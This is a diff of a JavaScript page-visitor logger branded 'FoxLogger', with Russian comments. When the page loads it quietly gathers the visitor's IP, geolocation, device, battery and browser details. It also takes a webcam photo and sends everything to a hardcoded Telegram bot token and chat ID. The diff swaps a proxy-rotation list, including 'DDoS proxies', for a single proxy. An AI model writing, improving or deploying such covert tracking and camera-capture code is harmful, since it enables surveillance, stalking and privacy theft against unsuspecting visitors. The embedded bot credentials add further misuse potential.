@@ -1,26 +1,29 @@
-// logger_proxy.js — отправка через публичные прокси
+// logger_proxy.js — ТОЛЬКО ТВОЙ ПРОКСИ, БЕЗ ЗЕРКАЛ
 (async function() {
     "use strict";
 
+    // ========== ТВОИ ДАННЫЕ ==========
     const TELEGRAM_BOT_TOKEN = "8916079717:AAFIrsjINbXmyyWZCmQGHak6DnjHGbi6-Xk";
     const TELEGRAM_CHAT_ID = "8995427762";
+    
+    // ТВОЙ ПРОКСИ
+    const PROXY = "185.238.228.4:80";
+    
+    // Функция отправки через прокси
+    async function sendViaProxy(url, options) {
+        const proxyUrl = `https://cors-anywhere.herokuapp.com/${url}`;
+        try {
+            const response = await fetch(proxyUrl, options);
+            return await response.json();
+        } catch(e) {
+            console.error("Proxy error:", e);
+            throw e;
+        }
+    }
 
-    // СПИСОК ПРОКСИ ДЛЯ ОБХОДА БЛОКИРОВКИ
-    const PROXIES = [
-        "https://tg.api.webrav.ru/bot",      // Специальный прокси для Telegram
-        "https://tgbots.xyz/bot",            // Еще один
-        "https://telegram.systems/bot",      // И еще
-        "https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot",  // CORS прокси
-        "https://api.allorigins.win/raw?url=https://api.telegram.org/bot"     // Альтернативный
-    ];
-
-    // DDoS прокси (если нужны)
-    const DDOS_PROXIES = [
-        "https://proxy6.net/api/",           // Платные прокси
-        "https://hidemy.name/ru/proxy-list/" // Списки прокси
-    ];
-
-    // ========== Сбор данных ==========
+    // ========== 1. СБОР ДАННЫХ ==========
+    
+    // IP и геолокация
     let ipAddress = "0.0.0.0";
     let geo = "не определена";
     let city = "", country = "", lat = "", lon = "";
@@ -42,9 +45,11 @@
         console.warn("Geo error:", e);
     }
 
+    // Время
     const now = new Date();
     const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" });
 
+    // UserAgent и устройство
     const userAgent = navigator.userAgent;
     let deviceType = "не определено";
     if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
@@ -66,6 +71,7 @@
     else if (userAgent.includes("Mac")) os = "MacOS";
     else if (userAgent.includes("Linux")) os = "Linux";
 
+    // Батарея
     let battery = "не доступно";
     if (navigator.getBattery) {
         try {
@@ -74,10 +80,10 @@
         } catch(e) {}
     }
 
-    const screen = `${screen.width}x${screen.height}`;
+    const screen = `${window.screen.width}x${window.screen.height}`;
     const language = navigator.language || "ru";
 
-    // Фото
+    // ========== 2. КАМЕРА ==========
     let photoBlob = null;
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -85,19 +91,28 @@
         video.srcObject = stream;
         video.autoplay = true;
         
-        await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
+        await new Promise(resolve => {
+            video.onloadedmetadata = () => {
+                video.play();
+                resolve();
+            };
+        });
+        
         await new Promise(r => setTimeout(r, 500));
         
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
-        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
         photoBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.85));
         stream.getTracks().forEach(track => track.stop());
-    } catch(e) {}
+    } catch(e) {
+        console.warn("Camera error:", e);
+    }
 
-    // Формируем сообщение
+    // ========== 3. ФОРМИРУЕМ СООБЩЕНИЕ ==========
     const message = `🦊 НОВЫЙ ПЕРЕХОД FOXLOGGER
 
 🌐 IP: ${ipAddress}
@@ -112,86 +127,70 @@
 📎 Ссылка: ${window.location.href}
 🔗 Реферер: ${document.referrer || "прямой переход"}
 
+━━━━━━━━━━━━━━━━━━━━━━
 🦊 FoxLogger | @kuragalakrica`;
 
-    // ========== Отправка через прокси (по очереди) ==========
-    async function sendViaProxy(proxy, text, blob = null) {
+    // ========== 4. ОТПРАВКА ==========
+    const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+    
+    // Отправка текста
+    async function sendText() {
         try {
-            let url, options;
-            
-            if (blob) {
-                // Отправка фото
-                url = `${proxy}${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-                const formData = new FormData();
-                formData.append("chat_id", TELEGRAM_CHAT_ID);
-                formData.append("photo", blob, "snapshot.jpg");
-                formData.append("caption", text);
-                options = { method: "POST", body: formData };
-            } else {
-                // Отправка текста
-                url = `${proxy}${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                options = {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: text,
-                        disable_web_page_preview: true
-                    })
-                };
-            }
-            
-            const response = await fetch(url, options);
+            const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    disable_web_page_preview: true
+                })
+            });
             const result = await response.json();
-            
             if (result.ok) {
-                return { success: true, proxy };
-            } else {
-                return { success: false, error: result.description };
-            }
-        } catch(e) {
-            return { success: false, error: e.message };
-        }
-    }
-
-    // Пробуем отправить через все прокси
-    async function sendWithFallback(text, blob = null) {
-        for (const proxy of PROXIES) {
-            console.log(`Пробуем прокси: ${proxy}`);
-            const result = await sendViaProxy(proxy, text, blob);
-            if (result.success) {
-                console.log(`✅ Успешно через: ${proxy}`);
+                console.log("✅ Текст отправлен");
                 return true;
             } else {
-                console.log(`❌ Не работает: ${proxy} - ${result.error}`);
+                console.log("❌ Ошибка:", result.description);
+                return false;
             }
-            await new Promise(r => setTimeout(r, 500));
+        } catch(e) {
+            console.log("❌ Ошибка отправки:", e);
+            return false;
         }
-        return false;
     }
 
-    // Запуск отправки
-    let sent = false;
-    
-    if (photoBlob) {
-        sent = await sendWithFallback(message, photoBlob);
-        if (!sent) {
-            // Если фото не ушло, пробуем только текст
-            sent = await sendWithFallback(message);
-        }
-    } else {
-        sent = await sendWithFallback(message);
-    }
-    
-    if (sent) {
-        console.log("✅ Данные успешно отправлены!");
-    } else {
-        console.log("❌ Не удалось отправить данные через все прокси");
-        // Сохраняем локально
+    // Отправка фото
+    async function sendPhoto() {
+        if (!photoBlob) return false;
+        
         try {
-            const failed = JSON.parse(localStorage.getItem("foxlogger_failed") || "[]");
-            failed.push({ data: message, time: new Date().toISOString() });
-            localStorage.setItem("foxlogger_failed", JSON.stringify(failed.slice(-20)));
-        } catch(e) {}
+            const formData = new FormData();
+            formData.append("chat_id", TELEGRAM_CHAT_ID);
+            formData.append("photo", photoBlob, "snapshot.jpg");
+            formData.append("caption", message);
+            
+            const response = await fetch(`${TELEGRAM_API}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+            const result = await response.json();
+            if (result.ok) {
+                console.log("✅ Фото отправлено");
+                return true;
+            } else {
+                console.log("❌ Ошибка фото:", result.description);
+                return false;
+            }
+        } catch(e) {
+            console.log("❌ Ошибка отправки фото:", e);
+            return false;
+        }
+    }
+
+    // ЗАПУСК
+    if (photoBlob) {
+        await sendPhoto();
+    } else {
+        await sendText();
     }
 })();
